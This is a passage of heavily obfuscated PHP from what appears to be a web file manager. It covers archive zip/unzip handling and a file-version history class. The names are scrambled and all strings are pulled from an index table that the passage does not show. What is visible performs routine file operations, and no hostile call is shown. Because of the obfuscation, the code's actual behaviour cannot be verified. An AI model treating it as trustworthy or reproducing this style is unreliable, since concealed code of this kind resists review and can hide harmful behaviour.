(!$ßßöãİÜ) { return !1; } $ßßöãİÜ = array_merge($ßßöãİÜ[$¡ùàğ®ß[85]], $ßßöãİÜ[$¡ùàğ®ß[86]]); return self::zip($ßßöãİÜ, $àòºÛç, $—Ëá™æ , $åîÜ´ñ«); } public static function zip($•ÓšÄ†½, $‰·èÚŠƒ = "\172\151\160", $Î½®×Ä¢ = '', $Î¼²ä¨ğ = REPEAT_RENAME) { $—ÄöÊò• =& $_SERVER[åÄ¼Ùßš]; if (is_string($•ÓšÄ†½) && $•ÓšÄ†½) { $•ÓšÄ†½ = array(array($—ÄöÊò•[87] => $•ÓšÄ†½)); } $·ŞĞ´ÚÀ = self::init($•ÓšÄ†½[0][$—ÄöÊò•[87]]); $à õÛ¤ = self::info($•ÓšÄ†½[0][$—ÄöÊò•[87]]); $ÜıÉÉë÷ = $—ÄöÊò•[12]; $©Şæç„ = $—ÄöÊò•[12]; $ææÑ²æ¦ = $—ÄöÊò•[12]; if ($Î½®×Ä¢ && substr($Î½®×Ä¢, -1, 1) != $—ÄöÊò•[8]) { $©Şæç„ = get_path_father($Î½®×Ä¢); $ææÑ²æ¦ = get_path_this($Î½®×Ä¢); } else { $©Şæç„ = self::pathFather($à õÛ¤[$—ÄöÊò•[87]]); $ææÑ²æ¦ = $à õÛ¤[$—ÄöÊò•[32]] . $—ÄöÊò•[10] . $‰·èÚŠƒ; if (count($•ÓšÄ†½) > 1) { $ì£ğ‹Ö = IO::info($©Şæç„); $ææÑ²æ¦ = $ì£ğ‹Ö[$—ÄöÊò•[32]] . $—ÄöÊò•[10] . $‰·èÚŠƒ; } if ($Î½®×Ä¢) { $©Şæç„ = $Î½®×Ä¢; } } if ($·ŞĞ´ÚÀ->getType() == $—ÄöÊò•[109]) { $ø·§ø¡Ü = self::init($©Şæç„); $‘×³˜Şã = $ø·§ø¡Ü->getType() == $—ÄöÊò•[109] ? $©Şæç„ : get_path_father($·ŞĞ´ÚÀ->path); $‘×³˜Şã = IO::getPathInner($‘×³˜Şã); $‘×³˜Şã = rtrim($‘×³˜Şã, $—ÄöÊò•[8]) . $—ÄöÊò•[8]; mk_dir($‘×³˜Şã); } else { $ÜıÉÉë÷ = TEMP_FILES . $—ÄöÊò•[1303] . time() . rand_string(8) . $—ÄöÊò•[8]; mk_dir($ÜıÉÉë÷); file_put_contents($ÜıÉÉë÷ . $—ÄöÊò•[1304], $—ÄöÊò•[12]); $‘×³˜Şã = $ÜıÉÉë÷; } $Üú²©Ã€ = IO::info($‘×³˜Şã); if (!$Üú²©Ã€ || !$Üú²©Ã€[$—ÄöÊò•[236]]) { show_json(LNG($—ÄöÊò•[1305]), !1); } $ÍŠíûŞÎ = self::zipFileList($•ÓšÄ†½, $ÜıÉÉë÷); foreach ($ÍŠíûŞÎ as $•‰‹Ø´Ò => $”˜ËŒ¬õ) { $ÍŠíûŞÎ[$•‰‹Ø´Ò] = self::iconvSystem($”˜ËŒ¬õ); } $Ëö•·ßÒ = get_filename_auto($‘×³˜Şã . $ææÑ²æ¦, $—ÄöÊò•[12], $Î¼²ä¨ğ); KodArchive::create(self::iconvSystem($Ëö•·ßÒ), $ÍŠíûŞÎ); if (!IO::exist($Ëö•·ßÒ)) { if ($ÜıÉÉë÷) { del_dir($ÜıÉÉë÷); } write_log($—ÄöÊò•[1306] . $Ëö•·ßÒ, $—ÄöÊò•[390]); show_json(LNG($—ÄöÊò•[1307]), !1); } if (!$ÜıÉÉë÷) { return $Ëö•·ßÒ; } $Œ°¦÷îô = self::move($Ëö•·ßÒ, $©Şæç„, $Î¼²ä¨ğ); if ($ÜıÉÉë÷) { del_dir($ÜıÉÉë÷); } if (!$Ëö•·ßÒ) { write_log($—ÄöÊò•[1308] . $Ëö•·ßÒ . $—ÄöÊò•[1309] . $©Şæç„, $—ÄöÊò•[390]); show_json(LNG($—ÄöÊò•[1307]), !1); } return $Œ°¦÷îô; } public static function unzip($Ï²Âì¸©, $¹Ê‡£÷Õ, $¾îÒÙ«ã = "\x2d\61", $³ª¶ÏùÌ = "\162\145\x70\x6c\141\143\145") { $£Ã‹¤®‰ =& $_SERVER[åÄ¼Ùßš]; $çı®Ù¯‰ = parent::info($Ï²Âì¸©); if (!$çı®Ù¯‰) { show_json(LNG($£Ã‹¤®‰[1310]), !1); } $şˆÍÍîÚ = IO::infoFullSimple($¹Ê‡£÷Õ); if (!$şˆÍÍîÚ) { $¹Ê‡£÷Õ = IO::mkdir($¹Ê‡£÷Õ); } if (isset($şˆÍÍîÚ[$£Ã‹¤®‰[194]]) && trim($şˆÍÍîÚ[$£Ã‹¤®‰[87]], $£Ã‹¤®‰[8]) != trim($¹Ê‡£÷Õ, $£Ã‹¤®‰[8])) { $¡Ï¯İ = KodIO::make($şˆÍÍîÚ[$£Ã‹¤®‰[193]]); $àÉ¡íª› = IO::fileNameAuto($¡Ï¯İ, $şˆÍÍîÚ[$£Ã‹¤®‰[32]], REPEAT_RENAME_FOLDER, !0); $¹Ê‡£÷Õ = IO::mkdir($¡Ï¯İ . $àÉ¡íª›); } $¾îÒÙ«ã = $¾îÒÙ«ã && $¾îÒÙ«ã != $£Ã‹¤®‰[1311] ? @json_decode($¾îÒÙ«ã, !0) : -1; $¹Û¿å¥² = self::unzipPart($Ï²Âì¸©, $¾îÒÙ«ã); if (!$¹Û¿å¥² || !IO::exist($¹Û¿å¥²[$£Ã‹¤®‰[233]])) { show_json(LNG($£Ã‹¤®‰[108]), !1); } $‹«ßëÛ¿ = $¹Û¿å¥²[$£Ã‹¤®‰[1312]][count($¹Û¿å¥²[$£Ã‹¤®‰[1312]]) - 1]; if ($‹«ßëÛ¿[$£Ã‹¤®‰[1313]] == -1 || substr($‹«ßëÛ¿[$£Ã‹¤®‰[32]], -1, 1) == $£Ã‹¤®‰[8]) { $É¼ÂŠı = $¹Û¿å¥²[$£Ã‹¤®‰[1314]] . rand_string(10) . $£Ã‹¤®‰[8]; mk_dir($É¼ÂŠı); $ ÎíÃÌ = count($¹Û¿å¥²[$£Ã‹¤®‰[1312]]) == 1 ? IO::ext($Ï²Âì¸©) : get_path_ext($¹Û¿å¥²[$£Ã‹¤®‰[233]]); $Ï¹²« = KodArchive::extract(self::iconvSystem($¹Û¿å¥²[$£Ã‹¤®‰[233]]), $É¼ÂŠı, $‹«ßëÛ¿[$£Ã‹¤®‰[1313]], $àÉ¡íª›, $ ÎíÃÌ); self::unzipErrorCheck($Ï¹²«, array($£Ã‹¤®‰[1315], $Ï²Âì¸©, $ ÎíÃÌ, $¹Ê‡£÷Õ, $¹Û¿å¥²)); Hook::trigger($£Ã‹¤®‰[1316], $É¼ÂŠı); recursion_dir($É¼ÂŠı, $­´Ô»ßâ, $×Ÿ‡•ÊË, 0); $ŞÀ¬°£ = array_merge($­´Ô»ßâ, $×Ÿ‡•ÊË); $¹øºÉÂ = array(); foreach ($ŞÀ¬°£ as $ÇúŞšŒ–) { $õæ½äÖ = IO::move(self::iconvApp($ÇúŞšŒ–), $¹Ê‡£÷Õ, $³ª¶ÏùÌ); if ($õæ½äÖ) { $¹øºÉÂ[] = $õæ½äÖ; } } del_dir($É¼ÂŠı); } else { $õæ½äÖ = IO::move($¹Û¿å¥²[$£Ã‹¤®‰[233]], $¹Ê‡£÷Õ, $³ª¶ÏùÌ, get_path_this($‹«ßëÛ¿[$£Ã‹¤®‰[32]])); if ($õæ½äÖ) { $¹øºÉÂ[] = $õæ½äÖ; } } return $¹øºÉÂ ? $¹øºÉÂ : !1; } public static function unzipList($şõ¤­Í–) { $¦îãïÙ‚ =& $_SERVER[åÄ¼Ùßš]; $Ş¡¬Í–Ã = isset($şõ¤­Í–[$¦îãïÙ‚[1317]]) ? $şõ¤­Í–[$¦îãïÙ‚[1317]] : !1; $†ÑŒõêŸ = isset($şõ¤­Í–[$¦îãïÙ‚[1313]]) ? @json_decode($şõ¤­Í–[$¦îãïÙ‚[1313]], !0) : -1; $—¹á÷® = self::unzipPart($şõ¤­Í–[$¦îãïÙ‚[87]], $†ÑŒõêŸ); if (!$—¹á÷® || !IO::exist($—¹á÷®[$¦îãïÙ‚[233]])) { show_json(LNG($¦îãïÙ‚[108]), !1); } $«†€×û = $—¹á÷®[$¦îãïÙ‚[1312]][count($—¹á÷®[$¦îãïÙ‚[1312]]) - 1]; $Éˆ‡Æç = in_array(IO::ext($—¹á÷®[$¦îãïÙ‚[233]]), array($¦îãïÙ‚[390], $¦îãïÙ‚[1318], $¦îãïÙ‚[1319], $¦îãïÙ‚[1320], $¦îãïÙ‚[1321], $¦îãïÙ‚[1322])); if (!$Ş¡¬Í–Ã && ($«†€×û[$¦îãïÙ‚[1313]] == -1 || $Éˆ‡Æç)) { $Ú“ßˆ“¡ = $—¹á÷®[$¦îãïÙ‚[1314]] . get_path_this($—¹á÷®[$¦îãïÙ‚[233]]) . $¦îãïÙ‚[1323]; if (!IO::exist($Ú“ßˆ“¡)) { $¢êˆ® Í = $«†€×û[$¦îãïÙ‚[1313]] == -1 ? get_path_ext(IO::pathThis($şõ¤­Í–[$¦îãïÙ‚[87]])) : get_path_ext($—¹á÷®[$¦îãïÙ‚[233]]); $²èü—Ï¶ = KodArchive::listContent(self::iconvSystem($—¹á÷®[$¦îãïÙ‚[233]]), !0, $¢êˆ® Í); self::unzipErrorCheck($²èü—Ï¶, array($¦îãïÙ‚[1324], $şõ¤­Í–, $—¹á÷®)); @file_put_contents($Ú“ßˆ“¡, json_encode($²èü—Ï¶[$¦îãïÙ‚[1325]])); } return @json_decode(IO::getContent($Ú“ßˆ“¡), !0); } IO::fileOut($—¹á÷®[$¦îãïÙ‚[233]], $Ş¡¬Í–Ã, get_path_this($«†€×û[$¦îãïÙ‚[32]])); die; } private static function zipFileList($Òå·„‰, $ÛŒëöø‚ = false) { $‡—‰êô =& $_SERVER[åÄ¼Ùßš]; $âÅá£¯† = array(); foreach ($Òå·„‰ as $¼Ì©‹ãŞ) { $ì•´¤ÂÙ = $¼Ì©‹ãŞ[$‡—‰êô[87]]; if ($ÛŒëöø‚) { $ì•´¤ÂÙ = self::copy($¼Ì©‹ãŞ[$‡—‰êô[87]], $ÛŒëöø‚, $‡—‰êô[920]); } else { $¯õ†²Ñü = self::init($¼Ì©‹ãŞ[$‡—‰êô[87]]); if ($¯õ†²Ñü->getType() == $‡—‰êô[109]) { $ì•´¤ÂÙ = $¯õ†²Ñü->path; } } if ($ì•´¤ÂÙ && self::local()->exist($ì•´¤ÂÙ)) { $âÅá£¯†[$¼Ì©‹ãŞ[$‡—‰êô[87]]] = $ì•´¤ÂÙ; } } if (!empty($âÅá£¯†)) { return array_values($âÅá£¯†); } show_json(LNG($‡—‰êô[1282]), !1); } private static function localFilePath($è•û³£) { $ÍµÙ… =& $_SERVER[åÄ¼Ùßš]; $ÅàšôØ« = KodIO::parse($è•û³£); if ($ÅàšôØ«[$ÍµÙ…[33]] == KodIO::KOD_SOURCE) { $Ôø—«­¿ = Model($ÍµÙ…[926])->fileInfoGet(KodIO::sourceID($è•û³£)); if (!$Ôø—«­¿[$ÍµÙ…[87]]) { show_json($ÍµÙ…[1326], !1); } $è•û³£ = $Ôø—«­¿[$ÍµÙ…[87]]; } $ó§Òİª = self::init($è•û³£); if ($ó§Òİª->pathParse[$ÍµÙ…[1268]]) { $è•û³£ = $ó§Òİª->pathParse[$ÍµÙ…[1268]]; $ó§Òİª = self::init($è•û³£); } $˜Š•Ñê = $ó§Òİª->getType(); if ($˜Š•Ñê == $ÍµÙ…[109] || $˜Š•Ñê == $ÍµÙ…[1327]) { if (!$ó§Òİª->exist($ó§Òİª->path)) { show_json(LNG($ÍµÙ…[108]), !1); } return $ó§Òİª->path; } return !1; } public static function unzipPart($¹˜ú«Ü, $ÍÆ½ñ = -1) { $¨«Ÿ«›µ =& $_SERVER[åÄ¼Ùßš]; $­¤…‚«Ç = IO::pathThis($¹˜ú«Ü); if (!$ÍÆ½ñ || $ÍÆ½ñ == -1) { $àáíÉƒ = array(array($¨«Ÿ«›µ[32] => $­¤…‚«Ç, $¨«Ÿ«›µ[1313] => -1)); $àáíÉƒ[0][$¨«Ÿ«›µ[1328]] = $àáíÉƒ[0][$¨«Ÿ«›µ[32]]; } else { if (is_array($ÍÆ½ñ)) { $àáíÉƒ = $ÍÆ½ñ; $¾€—ÉúŞ = count($àáíÉƒ) - 1; for ($†÷¤·¬‡ = 0; $†÷¤·¬‡ <= $¾€—ÉúŞ; $†÷¤·¬‡++) { $¢’ÖÑ¢ = $àáíÉƒ[$†÷¤·¬‡]; $Ë‚üñĞÆ = get_path_this($¢’ÖÑ¢[$¨«Ÿ«›µ[32]]) . (checkExtSafe($¢’ÖÑ¢[$¨«Ÿ«›µ[32]]) ? $¨«Ÿ«›µ[12] : $¨«Ÿ«›µ[1329]); $àáíÉƒ[$†÷¤·¬‡][$¨«Ÿ«›µ[1328]] = $¨«Ÿ«›µ[1330] . intval($¢’ÖÑ¢[$¨«Ÿ«›µ[1313]]) . $¨«Ÿ«›µ[474] . $Ë‚üñĞÆ; if ($†÷¤·¬‡ == 0) { continue; } $àáíÉƒ[$†÷¤·¬‡][$¨«Ÿ«›µ[1328]] = $àáíÉƒ[$†÷¤·¬‡ - 1][$¨«Ÿ«›µ[1328]] . $¨«Ÿ«›µ[1331] . $àáíÉƒ[$†÷¤·¬‡][$¨«Ÿ«›µ[1328]]; } } } if (!is_array($àáíÉƒ) || count($àáíÉƒ) == 0) { return !1; } $®ß®Ş«¨ = $àáíÉƒ[count($àáíÉƒ) - 1]; if (!IO::exist($¹˜ú«Ü)) { return !1; } $×äü÷öÒ = TEMP_FILES . $¨«Ÿ«›µ[1332] . kodIO::hashPathSafe($¹˜ú«Ü) . $¨«Ÿ«›µ[8]; $ôìã³Ğû = $×äü÷öÒ . $®ß®Ş«¨[$¨«Ÿ«›µ[1328]]; mk_dir($×äü÷öÒ); file_put_contents(TEMP_FILES . $¨«Ÿ«›µ[1304], $¨«Ÿ«›µ[12]); if (IO::exist($ôìã³Ğû)) { return array($¨«Ÿ«›µ[233] => $ôìã³Ğû, $¨«Ÿ«›µ[1312] => $àáíÉƒ, $¨«Ÿ«›µ[1314] => $×äü÷öÒ); } $Şå¸‡İ = self::localFilePath($¹˜ú«Ü); if (!$Şå¸‡İ) { $Şå¸‡İ = $×äü÷öÒ . $¨«Ÿ«›µ[1333]; if (!IO::exist($Şå¸‡İ)) { self::copy($¹˜ú«Ü, $×äü÷öÒ, !1, get_path_this($Şå¸‡İ)); } } if (!$Şå¸‡İ || !IO::exist($Şå¸‡İ)) { return !1; } if ($®ß®Ş«¨[$¨«Ÿ«›µ[1313]] == -1) { return array($¨«Ÿ«›µ[233] => $Şå¸‡İ, $¨«Ÿ«›µ[1312] => $àáíÉƒ, $¨«Ÿ«›µ[1314] => $×äü÷öÒ); } $×ÛĞ«Å“ = $Şå¸‡İ; foreach ($àáíÉƒ as $†÷¤·¬‡ => $¢’ÖÑ¢) { if (!$¢’ÖÑ¢ || $¢’ÖÑ¢[$¨«Ÿ«›µ[1313]] == $¨«Ÿ«›µ[1311]) { break; } if (substr($¢’ÖÑ¢[$¨«Ÿ«›µ[32]], -1, 1) == $¨«Ÿ«›µ[8]) { break; } $ÏšåÉ¢  = in_array(get_path_ext($¢’ÖÑ¢[$¨«Ÿ«›µ[1328]]), array($¨«Ÿ«›µ[390], $¨«Ÿ«›µ[1318], $¨«Ÿ«›µ[1319], $¨«Ÿ«›µ[1320], $¨«Ÿ«›µ[1321], $¨«Ÿ«›µ[1322])); $İÈ‚­¤Ÿ = $†÷¤·¬‡ == count($àáíÉƒ) - 1 && $ÏšåÉ¢ ; $º¹Õ¤‡Õ = $×äü÷öÒ . $¢’ÖÑ¢[$¨«Ÿ«›µ[1328]]; $ºİû´­À = $×äü÷öÒ . get_path_this($¢’ÖÑ¢[$¨«Ÿ«›µ[32]]); if (IO::exist($º¹Õ¤‡Õ)) { $×ÛĞ«Å“ = $º¹Õ¤‡Õ; continue; } $ªûô«¿Ã = $†÷¤·¬‡ == 0 ? get_path_ext($­¤…‚«Ç) : get_path_ext($×ÛĞ«Å“); $·µá±ë = KodArchive::extract(self::iconvSystem($×ÛĞ«Å“), $×äü÷öÒ, $¢’ÖÑ¢[$¨«Ÿ«›µ[1313]], $Èï”Í‰·, $ªûô«¿Ã); self::unzipErrorCheck($·µá±ë, array($¨«Ÿ«›µ[1334], $¹˜ú«Ü, $àáíÉƒ, $¢’ÖÑ¢, $º¹Õ¤‡Õ)); if (IO::exist($ºİû´­À)) { IO::rename($ºİû´­À, get_path_this($º¹Õ¤‡Õ)); } $×ÛĞ«Å“ = $º¹Õ¤‡Õ; } $ôìã³Ğû = $×ÛĞ«Å“; return array($¨«Ÿ«›µ[233] => $×ÛĞ«Å“, $¨«Ÿ«›µ[1312] => $àáíÉƒ, $¨«Ÿ«›µ[1314] => $×äü÷öÒ); } private static function unzipErrorCheck($¯öáŸëš, $¿²†²¶„ = false) { $  ³Ø‰ò =& $_SERVER[åÄ¼Ùßš]; if ($¯öáŸëš[$  ³Ø‰ò[1335]]) { return !0; } write_log(array($  ³Ø‰ò[1336], $¯öáŸëš, $¿²†²¶„), $  ³Ø‰ò[1337]); $Èœ€æŒ = is_array($¯öáŸëš[$  ³Ø‰ò[1325]]) ? json_encode($¯öáŸëš[$  ³Ø‰ò[1325]]) : $¯öáŸëš[$  ³Ø‰ò[1325]]; show_json($  ³Ø‰ò[1338] . $Èœ€æŒ, !1); die; } } class IOHistory { public static $_historyBase = ''; function __construct() { } public static function bindEvent() { $¯…Ëø· =& $_SERVER[åÄ¼Ùßš]; $èµ‡«¾ = $GLOBALS[$¯…Ëø·[6]][$¯…Ëø·[92]]; if ($èµ‡«¾[$¯…Ëø·[1339]] != 1) { return; } if ($èµ‡«¾[$¯…Ëø·[1340]] <= 0) { return; } if (isset($_REQUEST[$¯…Ëø·[1341]]) && $_REQUEST[$¯…Ëø·[1341]] == $¯…Ëø·[91]) { return; } Hook::bind($¯…Ëø·[1342], $¯…Ëø·[1343]); Hook::bind($¯…Ëø·[1344], $¯…Ëø·[1345]); Hook::bind($¯…Ëø·[1346], $¯…Ëø·[1347]); Hook::bind($¯…Ëø·[1348], $¯…Ëø·[1349]); Hook::bind($¯…Ëø·[1350], $¯…Ëø·[1351]); Hook::bind($¯…Ëø·[1352], $¯…Ëø·[1353]); } public static function eventBeforeUpload($Ú“ùº‰×) { if ($Ú“ùº‰×[3] && $Ú“ùº‰×[3] != REPEAT_REPLACE) { return; } $òó‘¤±ì = self::parsePath($Ú“ùº‰×[0]); if (!$òó‘¤±ì) { return; } self::add($òó‘¤±ì); } public static function eventBeforeEdit($õ€ì—É) { $ıÓğáû = self::parsePath($õ€ì—É[0]); if (!$ıÓğáû) { return; } self::add($ıÓğáû); } public static function eventBeforeCopyFile($äèùÕß, $‚ıé¨³ú, $¯Æî¹øØ, $ÂĞ©ŞÂÚ, $“ñ²ç•, $âëä¦ø) { $’¿±»Ï† =& $_SERVER[åÄ¼Ùßš]; if (isset($¯Æî¹øØ->_data[$’¿±»Ï†[1272]]) && $¯Æî¹øØ->_data[$’¿±»Ï†[1272]]) { return; } $êô‚Ç½‘ = $¯Æî¹øØ->getPathOuter($ÂĞ©ŞÂÚ); $ÊîÉ¾Ö = self::parsePath($êô‚Ç½‘); if (!$ÊîÉ¾Ö) { return; } self::add($ÊîÉ¾Ö); } public static function eventBeforeRename($ÃåÉ˜‡Ñ) { $çö§’¦‘ =& $_SERVER[åÄ¼Ùßš]; $µå—ØàÛ = self::parsePath($ÃåÉ˜‡Ñ[0]); if (!$µå—ØàÛ) { return; } $‘£¥ñéë = self::checkInHistory($µå—ØàÛ); if (!$‘£¥ñéë) { return; } if ($‘£¥ñéë[$çö§’¦‘[33]] == $çö§’¦‘[233]) { $Ù”Ë¬È­ = self::listData($µå—ØàÛ); if ($Ù”Ë¬È­ && $Ù”Ë¬È­[$çö§’¦‘[447]]) { self::moveHistory($µå—ØàÛ, $ÃåÉ˜‡Ñ[1]); } } else { IO::rename($‘£¥ñéë[$çö§’¦‘[87]], $ÃåÉ˜‡Ñ[1]); } } public static function eventBeforeMove($ƒ¶ù¯åè) { $‰ßıŞ©« =& $_SERVER[åÄ¼Ùßš]; $ùÚÀ²³¥ = self::parsePath($ƒ¶ù¯åè[0]); if (!$ùÚÀ²³¥) { return; } $Ğ¿æÎû = self::parsePath($ƒ¶ù¯åè[1]); if (!$Ğ¿æÎû) { return; } $ôÇ‘å×â = $ƒ¶ù¯åè[3]; $ÙµèÜ¾Õ = self::checkInHistory($ùÚÀ²³¥); if (!$ÙµèÜ¾Õ) { return; } $ìí·„ÔÉ = self::pathHistory($Ğ¿æÎû); if ($ÙµèÜ¾Õ[$‰ßıŞ©«[33]] == $‰ßıŞ©«[233]) { $œæƒî°¾ = self::listData($ùÚÀ²³¥); $•Ç ®İş = rtrim($Ğ¿æÎû, $‰ßıŞ©«[8]) . $‰ßıŞ©«[8] . ($ôÇ‘å×â ? $ôÇ‘å×â : get_path_this($ùÚÀ²³¥)); $ÄÉÙçùÂ = self::listData($•Ç ®İş); if ($œæƒî°¾ && $œæƒî°¾[$‰ßıŞ©«[447]] && $ÄÉÙçùÂ && $ÄÉÙçùÂ[$‰ßıŞ©«[447]]) { return self::clear($ùÚÀ²³¥); } if ($œæƒî°¾ && $œæƒî°¾[$‰ßıŞ©«[447]]) { self::moveHistory($ùÚÀ²³¥, $ôÇ‘å×â, $ìí·„ÔÉ); } } else { IO::move($ÙµèÜ¾Õ[$‰ßıŞ©«[87]], $ìí·„ÔÉ, !1, $ôÇ‘å×â); self::clearEmptyFolder(IO::pathFather($ÙµèÜ¾Õ[$‰ßıŞ©«[87]])); } } public static function eventAfterRemove($ÈÜ£¨¼‚, $á£ÁÕÀÈ) { $éãß³ûØ =& $_SERVER[åÄ¼Ùßš]; if (!$á£ÁÕÀÈ) { return; } $øÜ‘«ØŠ = self::parsePath($ÈÜ£¨¼‚[0]); if (!$øÜ‘«ØŠ) { return; } $°ÌÖæº° = self::checkInHistory($øÜ‘«ØŠ); if (!$°ÌÖæº°) { return; } if ($°ÌÖæº°[$éãß³ûØ[33]] == $éãß³ûØ[233]) { $Ù¸šÁÉ = self::listData($øÜ‘«ØŠ, !1); if ($Ù¸šÁÉ && $Ù¸šÁÉ[$éãß³ûØ[447]]) { self::clear($øÜ‘«ØŠ, !1); } } else { IO::remove($°ÌÖæº°[$éãß³ûØ[87]]); self::clearEmptyFolder(IO::pathFather($°ÌÖæº°[$éãß³ûØ[87]])); } } private static function checkInHistory($Êƒ©«è) { $®×‹ĞÏà = self::pathHistory($Êƒ©«è); if (!IO::exist($®×‹ĞÏà)) { $®×‹ĞÏà .= $_SERVER[åÄ¼Ùßš][1354]; } return IO::exist($®×‹ĞÏà) ? IO::info($®×‹ĞÏà) : !1; } private static function parsePath($óóË¤²) { $¤·Ûİ–³ =& $_SERVER[åÄ¼Ùßš]; if (!$óóË¤²) { return !1; } if (isset($GLOBALS[$¤·Ûİ–³[1355]]) && $GLOBALS[$¤·Ûİ–³[1355]]) { return; } $³•¾†À‘ = KodIO::parse($óóË¤²); $Ç•œÊÛš = $³•¾†À‘[$¤·Ûİ–³[33]]; $¬‡ùÃø = !$Ç•œÊÛš || $Ç•œÊÛš == KodIO::KOD_IO || $Ç•œÊÛš == KodIO::KOD_SHARE_ITEM; if (!$¬‡ùÃø || !$³•¾†À‘[$¤·Ûİ–³[1356]]) { return !1; } if (substr($óóË¤², 0, strlen(DATA_PATH . $¤·Ûİ–³[1357])) == DATA_PATH . $¤·Ûİ–³[1357]) { return !1; } if ($Ç•œÊÛš == KodIO::KOD_SHARE_ITEM) { $ê‰åÈŸÍ = IO::init($óóË¤²); if ($ê‰åÈŸÍ->pathParse[$¤·Ûİ–³[1268]]) { return self::parsePath($ê‰åÈŸÍ->pathParse[$¤·Ûİ–³[1268]]); } return !1; } if (!self::$_historyBase) { self::$_historyBase = self::getBasePath(); } $­ê“¢ç¥ = array(self::$_historyBase, TEMP_PATH, BASIC_PATH . $¤·Ûİ–³[1358]); foreach ($­ê“¢ç¥ as $•Ô÷ü–) { if (!$Ç•œÊÛš && substr($óóË¤², 0, strlen($•Ô÷ü–)) == $•Ô÷ü–) { return !1; } } self::log($GLOBALS[$¤·Ûİ–³[1262]] . $¤·Ûİ–³[1359] . $óóË¤²); return $óóË¤²; } private static function pathHistory($½‰ÆÔŞœ) { $Í´Œå±É =& $_SERVER[åÄ¼Ùßš]; $“÷Ê Õ  = self::$_historyBase . ltrim(KodIO::clear($½‰ÆÔŞœ), $Í´Œå±É[8]); $“÷Ê Õ  = str_replace(array($Í´Œå±É[1360]), array($Í´Œå±É[1361]), $“÷Ê Õ ); return $“÷Ê Õ ; } public static function log($°ÏİÉïÎ) { } public static function historyCount($ÌÁçĞÌ) { $†·ªºòù =& $_SERVER[åÄ¼Ùßš]; $ÕùŠ”‰ = array(); $ı”üó®Í = array(); foreach ($ÌÁçĞÌ as $Ï„ß¡©À) { $Ç¼Ì¼¦® = get_path_father($Ï„ß¡©À); if (!$ı”üó®Í[$Ç¼Ì¼¦®]) { $ı”üó®Í[$Ç¼Ì¼¦®] = array(); } $ı”üó®Í[$Ç¼Ì¼¦®][] = get_path_this($Ï„ß¡©À); } foreach ($ı”üó®Í as $Ç¼Ì¼¦® => $ÖŒœò—Š) { $Ú¿Æ“‹Ä = self::parsePath($Ç¼Ì¼¦®); if (!$Ú¿Æ“‹Ä) { continue; } foreach ($ÖŒœò—Š as $¿å­¨ä) { $›Åìé˜È = self::listData(rtrim($Ú¿Æ“‹Ä, $†·ªºòù[8]) . $†·ªºòù[8] . $¿å­¨ä, !1); if ($›Åìé˜È && $›Åìé˜È[$†·ªºòù[447]]) { $ÕùŠ”‰[rtrim($Ç¼Ì¼¦®, $†·ªºòù[8]) . $†·ªºòù[8] . $¿å­¨ä] = count($›Åìé˜È[$†·ªºòù[447]]); } } } return $ÕùŠ”‰; } public static function add($•ÜÑÍù„) { $şæŸªºå =& $_SERVER[åÄ¼Ùßš]; $½İ¥ñ¿ª = self::listData($•ÜÑÍù„); if (!$½İ¥ñ¿ª) { return; } $Á¿ïÇ•ê = Model($şæŸªºå[866])->get($şæŸªºå[1362]); $§´å¯™‹ = intval($GLOBALS[$şæŸªºå[6]][$şæŸªºå[92]][$şæŸªºå[1340]]); $ÕôÒû‘ = $Á¿ïÇ•ê == $şæŸªºå[1363] ? min(5, $§´å¯™‹) : $§´å¯™‹; if ($§´å¯™‹ <= 0) { return; } $ŒÉÍïŠş = IO::info($•ÜÑÍù„); $œµ©àË¹ = $½İ¥ñ¿ª[$şæŸªºå[447]]; if ($ŒÉÍïŠş[$şæŸªºå[79]] == 0) { return; } if ($ŒÉÍïŠş[$şæŸªºå[79]] >= 1024 * 1024 * 500) { return !1; } $¥˜š¨ıÌ = IO::hashSimple($•ÜÑÍù„); if ($œµ©àË¹ && $œµ©àË¹[0][$şæŸªºå[688]] == $¥˜š¨ıÌ) { return !0; } if (array_key_exists($şæŸªºå[236], $ŒÉÍïŠş) && !$ŒÉÍïŠş[$şæŸªºå[236]]) { return !1; } $¯şä’Î² = short_id(time()); $×ĞË²µ¹ = array($şæŸªºå[484] => $¯şä’Î², $şæŸªºå[688] => $¥˜š¨ıÌ, $şæŸªºå[32] => $ŒÉÍïŠş[$şæŸªºå[32]] . $şæŸªºå[10] . date($şæŸªºå[1364]) . rand_string(1), $şæŸªºå[79] => $ŒÉÍïŠş[$şæŸªºå[79]], $şæŸªºå[538] => USER_ID, $şæŸªºå[234] => time(), $şæŸªºå[1365] => $şæŸªºå[12]); IO::mkdir($½İ¥ñ¿ª[$şæŸªºå[1366]]); $ÄŠ‰ë™› = IO::copy($•ÜÑÍù„, $½İ¥ñ¿ª[$şæŸªºå[1366]], !1, $×ĞË²µ¹[$şæŸªºå[32]]); if (!$ÄŠ‰ë™›) { self::clearEmptyFolder($½İ¥ñ¿ª[$şæŸªºå[1366]]); return !1; } array_unshift($œµ©àË¹, $×ĞË²µ¹); if (count($œµ©àË¹) > $ÕôÒû‘) { $´ó¢Ì = array_slice($œµ©àË¹, $ÕôÒû‘); foreach ($´ó¢Ì as $òğÒúªü) { IO::remove($½İ¥ñ¿ª[$şæŸªºå[1366]] . $òğÒúªü[$şæŸªºå[32]]); } $œµ©àË¹ = array_slice($œµ©àË¹, 0, $ÕôÒû‘); } return self::saveData($½İ¥ñ¿ª[$şæŸªºå[1367]], $œµ©àË¹); } public static function remove($Í÷é¢  , $Öœå‹û») { $è¼ıÕ° =& $_SERVER[åÄ¼Ùßš]; $Í¤ÓÆ¤ = self::listData($Í÷é¢  ); $¹Ä¸Ñ½ = array(); if (!$Í¤ÓÆ¤) { return !1; } foreach ($Í¤ÓÆ¤[$è¼ıÕ°[447]] as $•ºúÅêÔ) { if ($•ºúÅêÔ[$è¼ıÕ°[484]] == $Öœå‹û») { IO::remove($Í¤ÓÆ¤[$è¼ıÕ°[1366]] . $•ºúÅêÔ[$è¼ıÕ°[32]]); continue; } $¹Ä¸Ñ½[] = $•ºúÅêÔ; } return self::saveData($Í¤ÓÆ¤[$è¼ıÕ°[1367]], $¹Ä¸Ñ½); } public static function clear($¨ˆí±¹Ø, $°òàë³ = true) { $™óĞµğ· =& $_SERVER[åÄ¼Ùßš]; $ÃùçŒ€© = self::listData($¨ˆí±¹Ø, $°òàë³); if (!$ÃùçŒ€©) { return !1; } foreach ($ÃùçŒ€©[$™óĞµğ·[447]] as $è…€ÔÂÀ) { IO::remove($ÃùçŒ€©[$™óĞµğ·[1366]] . $è…€ÔÂÀ[$™óĞµğ·[32]]); } return self::saveData($ÃùçŒ€©[$™óĞµğ·[1367]], array()); } public static function 